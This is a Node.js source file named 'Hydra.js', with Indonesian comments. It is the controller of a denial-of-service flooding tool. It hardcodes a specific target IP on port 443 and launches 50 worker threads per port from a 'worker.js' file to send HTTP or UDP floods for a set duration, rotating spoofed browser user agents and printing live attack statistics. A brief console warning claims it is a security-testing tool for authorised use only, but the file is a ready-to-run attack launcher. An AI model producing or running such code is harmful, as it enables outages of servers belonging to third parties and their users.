// File: Hydra.js
// Nama skrip: Hydra

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');
const url = require('url');
const path = require('path'); // Untuk path worker.js

// --- Konfigurasi Serangan ---
const TARGET_IP = '185.108.148.12';
const PORTS = [443];
const THREADS_PER_PORT = 50; // Akan diterjemahkan ke jumlah worker per port
const ATTACK_TYPE = 'http'; // 'http' atau 'udp'
const MODE = 'normal'; // 'normal' atau 'slow'
const DURATION_SEC = 120; // 0 untuk tak terbatas
const HTTP_METHOD = 'GET'; // Hanya relevan untuk attackType 'http'

// --- Data untuk Worker ---
// Sebaiknya data besar seperti ini diserahkan ke worker agar tidak membebani main thread
const USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
];
const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

// --- Statistik Global ---
let sentRequestsTotal = 0;
let activeConnectionsTotal = 0; 
let errorCountTotal = 0;
let serverErrorsTotal = 0;
let startTime = Date.now();
let attackDuration = DURATION_SEC > 0 ? DURATION_SEC * 1000 : null; // Dalam milidetik
let isStopping = false;
let workers = []; // Array untuk menyimpan referensi worker

// --- Fungsi Utama (Main Thread) ---
async function main() {
    console.log("\n" + `\x1b[1;36m------------------------------------------------------------\x1b[0m`);
    console.log(`\x1b[1;36m%s\x1b[0m`, "Inisialisasi...");
    console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);

    console.log(`
    ██╗░░░██╗███████╗░█████╗░██████╗░███████╗
    ██║░░░██║██╔════╝██╔══██╗██╔══██╗██╔════╝
    ██║░░░██║███████╗███████║██████╔╝███████╗
    ██║░░░██║╚════██║██╔══██║██╔══██╗╚════██║
    ╚██████╔╝███████║██║░░██║██║░░██║███████║
    ░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
    `);
    console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);

    console.warn(`\x1b[1;33m!!! PERINGATAN HYDRA !!!\x1b[0m`);
    console.warn(`\x1b[1;33mScript ini adalah alat PENGUJIAN KEAMANAN yang kuat.\x1b[0m`);
    console.warn(`\x1b[1;33mGunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.\x1b[0m`);
    console.warn(`\x1b[1;33mPenggunaan ILEGAL berakibat pada HUKUMAN PIDANA.\x1b[0m`);
    console.warn(`\x1b[1;31mTekan CTRL+C dalam 5 detik untuk membatalkan...\x1b[0m`);

    await new Promise(resolve => setTimeout(resolve, 5000));

    console.log(`\n\x1b[1;32mStarting HYDRA ${ATTACK_TYPE.toUpperCase()} (${MODE.toUpperCase()}) attack on ${TARGET_IP} on ports ${PORTS.join(', ')} with ${THREADS_PER_PORT} workers/port (Method: ${HTTP_METHOD}). Duration: ${DURATION_SEC > 0 ? DURATION_SEC + 's' : 'Unlimited'}...\x1b[0m`);

    startTime = Date.now(); // Reset start time

    const statsInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const displaySent = isNaN(sentRequestsTotal) ? 0 : sentRequestsTotal;
        const displayActive = isNaN(activeConnectionsTotal) ? 0 : activeConnectionsTotal;
        const displaySrvErr = isNaN(serverErrorsTotal) ? 0 : serverErrorsTotal;
        const displayErrors = isNaN(errorCountTotal) ? 0 : errorCountTotal;

        console.log(`\r[\x1b[1;36mSTATS\x1b[0m] Target: \x1b[1;36m${TARGET_IP}\x1b[0m | Sent: \x1b[1;32m${displaySent}\x1b[0m | Active Con: \x1b[1;34m${displayActive}\x1b[0m | Srv Err: \x1b[1;33m${displaySrvErr}\x1b[0m | Errors: \x1b[1;31m${displayErrors}\x1b[0m | Elapsed: ${elapsed.toFixed(1)}s`);
    }, 1000);

    const workerPromises = [];
    for (const port of PORTS) {
        for (let i = 0; i < THREADS_PER_PORT; i++) {
            const workerData = {
                targetIP: TARGET_IP,
                port: port,
                attackType: ATTACK_TYPE,
                mode: MODE,
                durationMs: attackDuration, 
                httpMethod: HTTP_METHOD,
                workerId: `${port}-${i}`,
                USER_AGENTS: USER_AGENTS, // Kirim data besar ke worker
                CHARSET: CHARSET
            };

            const worker = new Worker(path.join(__dirname, 'worker.js'), { workerData });
            workers.push(worker); // Simpan referensi worker

            const promise = new Promise((resolve, reject) => {
                worker.on('message', (message) => {
                    if (message.type === 'stats') {
                        sentRequestsTotal += message.sent || 0;
                        activeConnectionsTotal = message.active !== undefined ? message.active : activeConnectionsTotal;
                        errorCountTotal += message.errors || 0;
                        serverErrorsTotal += message.serverErrors || 0;
                    } else if (message.type === 'done') {
                        resolve({ workerId: workerData.workerId, status: 'completed' });
                    }
                });

                worker.on('error', (err) => {
                    errorCountTotal++;
                    console.error(`\nWorker ${workerData.workerId} error:`, err);
                    reject({ workerId: workerData.workerId, status: 'error', error: err });
                });

                worker.on('exit', (code) => {
                    if (code !== 0 && !isStopping) { 
                        errorCountTotal++;
                        console.error(`\nWorker ${workerData.workerId} exited with code ${code}`);
                        reject({ workerId: workerData.workerId, status: 'exit', code: code });
                    } else if (code === 0 && !isStopping) {
                        resolve({ workerId: workerData.workerId, status: 'completed' });
                    }
                });
            });
            workerPromises.push(promise);
        }
    }

    const sigIntHandler = async () => {
        if (isStopping) return;
        isStopping = true;
        console.log("\nCtrl+C detected. Initiating shutdown...");
        clearInterval(statsInterval);
        
        for (const worker of workers) {
            try {
                worker.postMessage({ type: 'stop' }); 
                await new Promise(res => setTimeout(res, 50)); 
            } catch (e) { /* Worker mungkin sudah berhenti */ }
        }
        
        console.log("Waiting for active tasks to finish or timeout...");
        await Promise.allSettled(workerPromises.map(p => 
            Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('Worker timeout during shutdown')), 5000))])
        )).catch(err => { /* Abaikan error saat shutdown */ });
        
        console.log("\nHydra attack stopped.");
        process.exit(0);
    };

    process.on('SIGINT', sigIntHandler);

    try {
        await Promise.all(workerPromises);
        clearInterval(statsInterval);
        const elapsed = (Date.now() - startTime) / 1000;
        console.log(`\n\n\x1b[1;36m------------------------------------------------------------\x1b[0m`);
        console.log(`\x1b[1;32mHydra attack finished.\x1b[0m`);
        console.log(`\x1b[1;36mTotal Sent Requests: \x1b[1;32m${sentRequestsTotal}\x1b[0m`);
        console.log(`\x1b[1;36mTotal Errors: \x1b[1;31m${errorCountTotal}\x1b[0m`);
        console.log(`\x1b[1;36mTotal Server Errors: \x1b[1;33m${serverErrorsTotal}\x1b[0m`);
        console.log(`\x1b[1;36mTotal Duration: \x1b[1;34m${elapsed.toFixed(2)}s\x1b[0m`);
        console.log(`\x1b[1;36m------------------------------------------------------------\x1b[0m`);
    } catch (err) {
        clearInterval(statsInterval);
        console.error("\nAttack encountered critical errors. Stopping...");
        console.error("Details:", err);
        process.removeListener('SIGINT', sigIntHandler);
        process.exit(1);
    } finally {
        process.removeListener('SIGINT', sigIntHandler);
    }
}

if (isMainThread) {
    main();
}
